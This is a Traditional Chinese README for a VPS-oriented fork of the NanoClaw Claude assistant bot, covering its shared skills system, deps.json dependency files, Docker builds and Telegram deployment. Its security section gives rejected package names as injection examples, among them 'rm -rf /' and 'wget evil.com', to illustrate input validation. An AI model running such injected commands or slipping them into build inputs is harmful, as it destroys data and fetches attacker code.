<p align="center">
  <img src="../../assets/nanoclaw-logo.png" alt="NanoClaw" width="400">
</p>

<p align="center">
  <b>NanoClaw VPS 版本</b><br>
  個人 Claude 助理，具備進階 Skills 架構<br>
  <i>基於 <a href="https://github.com/gavrielc/nanoclaw">gavrielc/nanoclaw</a> 的 Fork，針對 VPS 部署優化</i>
</p>

<p align="right">
  <a href="../../README.md">English</a> | <b>繁體中文</b>
</p>

---

## 🚀 這個 Fork 的新功能

本 Fork 引入了**生產級 Skills 管理系統**，專為 VPS 部署和多機器人配置設計：

### 主要改進

| 功能 | 原始版本 | 本 Fork | 優勢 |
|---------|----------|-----------|---------|
| **Skills 架構** | `.claude/skills/`（僅 main） | `/skills/` 共享目錄 | 所有群組都能使用共享 skills |
| **依賴管理** | 寫死在 Dockerfile | 聲明式 `deps.json` | 輕鬆新增/移除依賴 |
| **構建系統** | 單一 Dockerfile | 多階段 + 智能偵測 | 只安裝需要的內容 |
| **開發模式** | 每次改動都要重建 | 即時掛載 `dev.sh` | 快速開發 skills |
| **安全性** | 基本隔離 | 套件驗證 + 唯讀掛載 | 防止注入攻擊 |
| **VPS 優化** | 單一機器人 | 多機器人共享映像檔 | 高效資源使用 |

---

## 📁 專案結構

```
nanoclaw/
├── skills/                    # 🆕 共享 skills（所有群組可存取）
│   ├── README.md             # Skills 文件
│   ├── calculator/           # 數學運算 skill
│   │   ├── skill.md         # 使用文件
│   │   ├── deps.json        # 🆕 依賴聲明
│   │   └── calculator.py    # 實作
│   └── {your-skill}/        # 你的自訂 skills
├── container/
│   ├── Dockerfile           # 原始 Dockerfile
│   ├── Dockerfile.skills    # 🆕 多階段構建
│   ├── build.sh            # 🆕 智能構建腳本
│   ├── dev.sh              # 🆕 開發模式助手
│   └── docker-compose.dev.yml # 🆕 開發環境
├── src/
│   ├── index.ts            # 主路由
│   ├── container-runner.ts # 🆕 增強共享 skills 掛載
│   └── config.ts           # 設定
└── groups/
    ├── main/               # Main 群組（管理員權限）
    └── {group-name}/       # 每個群組的隔離儲存
        ├── CLAUDE.md       # 群組記憶
        └── .claude/skills/ # 群組專屬 skills
```

---

## 🎯 快速開始

### 前置需求

- Docker Desktop 或 Docker Engine
- Node.js 22+
- WhatsApp 或 Telegram 帳號
- Anthropic API 金鑰

### 安裝步驟

```bash
# 1. Clone 本 fork
git clone https://github.com/aceonaceon/nanoclaw
cd nanoclaw

# 2. 安裝依賴
npm install

# 3. 設定環境變數
cp .env.example .env
# 編輯 .env 並加入：
# - CLAUDE_CODE_OAUTH_TOKEN（從 claude.ai 設定取得）
# - TELEGRAM_BOT_TOKEN（從 @BotFather 取得）
# - ASSISTANT_NAME（觸發詞）

# 4. 使用 Skills 系統構建容器
cd container
./build.sh
cd ..

# 5. 測試容器（選用但建議）
./test-container.sh

# 6. 選擇執行模式：

# 選項 A：開發模式（用於測試、即時變更）
npm run dev

# 選項 B：生產模式（用於部署）
npm run build    # 編譯 TypeScript 為 JavaScript
npm start        # 執行編譯後的程式碼
```

### 🎮 執行模式說明

| 指令 | 功能 | 使用時機 |
|---------|--------------|-------------|
| `npm run dev` | 直接執行 TypeScript，支援熱重載 | 本地開發、測試變更 |
| `npm run build` | 編譯 TypeScript 為 JavaScript | 生產部署前 |
| `npm start` | 執行編譯後的 JavaScript | 生產環境、系統服務 |

**大多數使用者的建議**：
- **測試**：`npm run dev`（最快、自動重載）
- **生產**：`npm run build && npm start`（穩定、優化）

---

## 🛠️ Skills 系統

### 什麼是 Skills？

Skills 是擴展 NanoClaw 功能的模組化能力。與原始專案不同（只有 main 群組能存取專案級 skills），本 Fork 允許**所有群組共享通用 skills**，同時透過唯讀掛載維持安全性。

### 使用現有 Skills

Skills 會自動提供給 Claude。只需詢問：

- "計算 sqrt(144) + 2^3" → 使用 `calculator` skill
- "設定 NanoClaw" → 使用 `setup` skill
- "發布推文" → 使用 `x-integration` skill

### 新增 Skill

#### 1. 建立 Skill 結構

```bash
# 建立 skill 目錄
mkdir skills/weather-forecast
cd skills/weather-forecast
```

#### 2. 定義依賴（`deps.json`）

```json
{
  "skill": "weather-forecast",
  "version": "1.0.0",
  "description": "取得天氣預報",
  "dependencies": {
    "system": [
      {
        "type": "apt",
        "packages": ["curl"],
        "description": "用於 API 請求"
      }
    ],
    "runtime": {
      "node": [
        {
          "packages": ["axios"],
          "global": false,
          "description": "HTTP 客戶端"
        }
      ]
    }
  },
  "enabled": true,
  "builtin": false,
  "author": "your-github-username"
}
```

#### 3. 建立 Skill 文件（`skill.md`）

```markdown
---
name: weather-forecast
description: 取得任何地點的天氣預報
---

# 天氣預報

使用 OpenWeather API 提供當前天氣和預報。

## 使用方式
詢問任何城市的天氣："東京的天氣如何？"
```

#### 4. 實作 Skill

```python
#!/usr/bin/env python3
# weather.py
import json
import sys
import requests

def get_weather(city):
    # 實作內容
    return {"temperature": 22, "condition": "sunny"}

if __name__ == "__main__":
    city = sys.argv[1] if len(sys.argv) > 1 else "London"
    result = get_weather(city)
    print(json.dumps(result))
```

#### 5. 重建容器

```bash
cd ../../container
./build.sh

# 構建腳本會：
# - 偵測你的新 skill
# - 檢查是否啟用
# - 安裝所需依賴
# - 構建優化映像檔
```

### 啟用/停用 Skills

編輯 `skills/{skill-name}/deps.json`：

```json
{
  "enabled": false  // 設為 false 以停用
}
```

然後重建：`./build.sh`

---

## 🔧 開發模式

快速開發 skill 而不需重建：

```bash
cd container

# 構建開發容器
./dev.sh build

# 以即時 skill 掛載執行
./dev.sh run

# 測試特定 skill
./dev.sh test weather-forecast

# 開啟 shell 進行除錯
./dev.sh shell

# 驗證所有 skills
./dev.sh validate
```

---

## 🚢 VPS 部署

### 架構：Docker-in-Docker

NanoClaw 在 VPS 上使用兩層容器架構：

```
┌─────────────────────────────────────────────────────────────┐
│                     VPS 主機 (Ubuntu)                        │
│                                                              │
│  Docker Engine                                               │
│  ┌────────────────────────────────────────────────────────┐  │
│  │  主容器 (nanoclaw-bot1)                                │  │
│  │  - Node.js 路由程序                                    │  │
│  │  - Telegram 連線                                       │  │
│  │  - Docker CLI（透過 socket 掛載控制主機 Docker）        │  │
│  │                                                        │  │
│  │     每則訊息產生 ──▶  ┌───────────────────────┐        │  │
│  │                       │  Agent 容器           │        │  │
│  │                       │  - Claude Agent SDK   │        │  │
│  │                       │  - 沙箱化工具          │        │  │
│  │                       │  - 綁定掛載的目錄      │        │  │
│  │                       └───────────────────────┘        │  │
│  └────────────────────────────────────────────────────────┘  │
│                                                              │
│  Volumes: data-bot1/, groups-bot1/, store-bot1/              │
└──────────────────────────────────────────────────────────────┘
```

**主容器**負責 Telegram 訊息處理和路由。每收到一則訊息，會透過主機的 Docker socket 產生一個短暫的 **Agent 容器**。Agent 容器以沙箱化工具運行 Claude，並綁定掛載群組資料。

### 前置需求

- Ubuntu VPS（已在 22.04/24.04 測試，建議 2GB+ 記憶體）
- 已安裝 Docker Engine（[docs.docker.com/engine/install](https://docs.docker.com/engine/install/ubuntu/)）
- Git
- 以下認證方式擇一：
  - **Anthropic API Key**：從 [console.anthropic.com](https://console.anthropic.com/) 取得（按量計費，VPS 推薦）
  - **Claude OAuth Token**：Claude Pro/Max 訂閱方案（在本機執行 `claude` 後，從 `~/.claude/.credentials.json` 擷取 token）
- **Telegram Bot Token**：從 [@BotFather](https://t.me/BotFather) 取得 — 建立新 bot 並複製 token

### 部署步驟

```bash
# 1. Clone 專案
git clone https://github.com/aceonaceon/nanoclaw
cd nanoclaw

# 2. 設定環境變數
cp .env.vps.example .env
nano .env
# 必填：設定 ANTHROPIC_API_KEY（或 CLAUDE_CODE_OAUTH_TOKEN）和 BOT1_TOKEN

# 3. 初始化目錄結構（僅首次需要）
#    建立 groups-bot1/, data-bot1/, store-bot1/ 並設定正確權限
./init-vps-dirs.sh

# 4. 建置 agent 容器映像（首次，或更新 skills 後）
cd container && ./build.sh && cd ..

# 5. 啟動服務
docker compose -f docker-compose.vps.yml up -d --build

# 6. 配對你的 Telegram 聊天為主群組
./pair-main-group.sh
# → 開啟 Telegram，發送任意訊息給你的 bot，然後在終端確認

# 7. 確認正常運作
docker compose -f docker-compose.vps.yml logs -f nanoclaw-bot1
```

### Docker Compose 結構

實際的 `docker-compose.vps.yml` 使用 Docker-in-Docker 搭配主機 socket 掛載：

```yaml
services:
  nanoclaw-bot1:
    build:
      context: .
      dockerfile: Dockerfile.vps
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock  # 控制主機 Docker
      - ./data-bot1:/app/data         # Bot 狀態與 session
      - ./groups-bot1:/app/groups     # 群組記憶與檔案
      - ./store-bot1:/app/store       # Telegram 認證與 SQLite DB
      - ./container:/app/container    # Agent 容器建置上下文
    environment:
      - TELEGRAM_BOT_TOKEN=${BOT1_TOKEN}
      - ASSISTANT_NAME=${BOT1_NAME:-Andy}
      - ANTHROPIC_API_KEY=${ANTHROPIC_API_KEY}
      - HOST_PROJECT_ROOT=${PWD}          # 告知 agent 掛載使用主機路徑
      - HOST_GROUPS_DIR=${PWD}/groups-bot1
      - HOST_DATA_DIR=${PWD}/data-bot1
```

若要新增更多 bot，取消 `docker-compose.vps.yml` 中 `nanoclaw-bot2` 區段的註解，並在 `.env` 設定 `BOT2_TOKEN`。

### 更新與維護

```bash
cd nanoclaw

# 拉取最新變更
git pull

# 重建並重啟
docker compose -f docker-compose.vps.yml up -d --build

# 若 skills 或 agent 依賴有變更，也需重建 agent 映像：
cd container && ./build.sh && cd ..
docker compose -f docker-compose.vps.yml restart
```

### 重要事項

- `init-vps-dirs.sh` 會將目錄擁有者設為 UID 1000（agent 容器中的 `node` 使用者）— 這對綁定掛載權限至關重要
- Agent 容器的 entrypoint 也會執行 `chown` 作為安全網，再透過 `gosu` 降權至 `node`
- `HOST_PROJECT_ROOT` 環境變數會觸發 `container-runner.ts` 中的 VPS 模式，使用主機路徑而非容器內部路徑進行綁定掛載
- 配對後，可以直接與 bot 對話，不需要觸發詞

---

## 🔒 安全功能

### 套件名稱驗證

構建系統驗證所有套件名稱以防止注入攻擊：

```bash
# ✅ 有效套件
curl, python3, nodejs, @anthropic/sdk

# ❌ 拒絕（注入嘗試）
curl && rm -rf /, python3; wget evil.com
```

### 唯讀 Skill 掛載

共享 skills 以唯讀方式掛載到容器：

```typescript
// container-runner.ts
mounts.push({
  hostPath: sharedSkillsDir,
  containerPath: '/workspace/shared-skills',
  readonly: true  // 防止修改
});
```

### 隔離的群組 Skills

每個群組維護自己的可寫入 skill 目錄：
- 主機：`groups/{name}/.claude/skills/`
- 容器：`/workspace/group/.claude/skills/`

---

## 📊 與原始版本比較

### 架構差異

| 面向 | 原始版本（gavrielc） | 本 Fork |
|--------|---------------------|-----------|
| **Skills 位置** | `.claude/skills/` | `/skills/`（頂層） |
| **Skills 存取** | 僅 main 群組 | 所有群組（唯讀） |
| **依賴安裝** | 構建時（寫死） | 構建時（聲明式） |
| **Skill 依賴** | 在 Dockerfile | 每個 skill 的 `deps.json` |
| **構建過程** | 單階段 | 多階段快取 |
| **開發** | 需要重建 | 熱重載掛載 |
| **容器執行** | Apple Container | Docker（VPS 友善） |

### 從原始版本遷移

如果你從原始 NanoClaw 遷移：

```bash
# 1. 移動 skills 到新位置
mv .claude/skills/* skills/

# 2. 為每個 skill 新增 deps.json
# （見上方範例）

# 3. 使用新系統重建
./container/build.sh

# 4. 測試
npm run dev
```

---

## 🎨 自訂

### 新增系統套件

編輯 skill 的 `deps.json`：

```json
{
  "dependencies": {
    "system": [
      {"type": "apt", "packages": ["imagemagick", "ffmpeg"]}
    ]
  }
}
```

### 新增語言套件

```json
{
  "dependencies": {
    "runtime": {
      "node": [{"packages": ["express", "socket.io"]}],
      "python": [{"packages": ["numpy", "pandas"]}],
      "go": [{"package": "github.com/gin-gonic/gin@latest"}]
    }
  }
}
```

### 建立 MCP 工具

需要容器端工具的 skills：

```typescript
// skills/my-skill/agent.ts
import { tool } from '@anthropic-ai/claude-agent-sdk/mcp/create-server';

export function createMyTools() {
  return [
    tool('my_tool', '描述', {}, async () => {
      // 實作
    })
  ];
}
```

---

## 📋 Skill 類型

### 1. 文件型 Skills
為 Claude 提供指示，不執行程式碼：
- `setup` - 初始設定
- `customize` - 修改行為
- `debug` - 疑難排解

### 2. 工具型 Skills
可執行程式：
- `calculator` - 數學運算
- `x-integration` - 瀏覽器自動化

### 3. 整合型 Skills
修改 NanoClaw 本身：
- `add-gmail` - 電子郵件整合
- `add-voice-transcription` - 語音支援

---

## 🐛 疑難排解

### VPS：Agent 容器無回應（掛起）

最常見的 VPS 問題。按順序檢查：

```bash
# 1. 檢查 agent 容器是否有產生
docker ps -a --filter "ancestor=nanoclaw-agent:latest"

# 2. 檢查 agent 容器內的程序（找到執行中的容器）
docker exec <container_id> ps aux

# 3. 檢查 agent 容器內的檔案權限
docker exec <container_id> ls -la /home/node/.claude/
docker exec <container_id> ls -la /workspace/group/

# 4. 若權限顯示 root:root，重新執行初始化腳本：
./init-vps-dirs.sh
docker compose -f docker-compose.vps.yml restart
```

**根本原因**：主機以 root 建立目錄，但 agent 容器以 `node`（UID 1000）執行。entrypoint 的 `chown` + `init-vps-dirs.sh` 可修復此問題。

### VPS：日誌與除錯

```bash
# 主容器日誌（路由器、Telegram 連線）
docker compose -f docker-compose.vps.yml logs -f nanoclaw-bot1

# 詳細 agent 日誌
# 編輯 .env：LOG_LEVEL=debug，然後重啟

# 每次 agent 執行的日誌（在主容器掛載的 volume 中）
ls groups-bot1/main/logs/
```

### Skills 找不到

```bash
# 檢查 skills 是否掛載
docker run --rm \
  -v "$PWD/skills:/workspace/shared-skills:ro" \
  nanoclaw-agent:latest \
  node /app/validate-skills.cjs
```

### 構建錯誤

```bash
# 使用原始 Dockerfile 作為備用
./build.sh --original

# 檢查 skill 依賴
jq '.dependencies' skills/*/deps.json
```

### 容器錯誤

```bash
# 檢查日誌
docker logs nanoclaw-agent

# 除錯模式
LOG_LEVEL=debug npm run dev
```

---

## 🤝 貢獻

1. Fork 本倉庫
2. 在 `skills/` 建立你的 skill
3. 新增完整的 `deps.json`
4. 使用 `dev.sh` 測試
5. 提交 PR，包含：
   - Skill 文件
   - 測試範例
   - 依賴說明

---

## 📝 授權

MIT - 參見 [LICENSE](../../LICENSE)

---

## 🙏 致謝

- 原始專案：[gavrielc/nanoclaw](https://github.com/gavrielc/nanoclaw)
- Claude Agent SDK：[Anthropic](https://github.com/anthropics/claude-agent-sdk)
- Skills 架構：本 Fork

---

## 📚 資源

- [Skills 文件](../skills/README.md)
- [容器文件](../../container/README.md)
- [API 參考](../API.md)
- [部署指南](../DEPLOYMENT.md)

---

<p align="center">
  用 ❤️ 為 NanoClaw 社群打造<br>
  <a href="https://github.com/aceonaceon/nanoclaw/issues">回報錯誤</a> •
  <a href="https://github.com/aceonaceon/nanoclaw/pulls">提交 PR</a>
</p>